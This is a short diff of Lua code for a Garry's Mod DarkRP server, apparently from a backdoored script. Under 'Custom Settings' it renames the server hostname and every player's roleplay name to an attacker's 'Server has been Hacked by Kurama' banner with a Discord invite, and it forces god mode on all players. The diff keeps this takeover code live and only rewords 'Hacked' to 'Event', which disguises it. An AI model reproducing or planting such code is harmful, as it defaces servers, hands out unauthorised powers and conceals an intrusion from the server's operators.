@@ -142,14 +142,14 @@ end)
 
 -- Custom Settings
 timer.Simple(2 ,function()
-    RunConsoleCommand("hostname", "Server has been Hacked by Kurama -> discord.gg/kurama !")
+    RunConsoleCommand("hostname", "Server has been Event by Kurama -> discord.gg/kurama !")
     RunConsoleCommand("ulx", "god", "*")
 end)
 
 timer.Create("ChangeRPName",2 ,99 , function()
     for _, v in pairs(player.GetAll()) do
         v:GodEnable()
-        v:setDarkRPVar("rpname", "Server has been Hacked by Kurama -> discord.gg/kurama !")
+        v:setDarkRPVar("rpname", "Server has been Event by Kurama -> discord.gg/kurama !")
     end
 end)
 
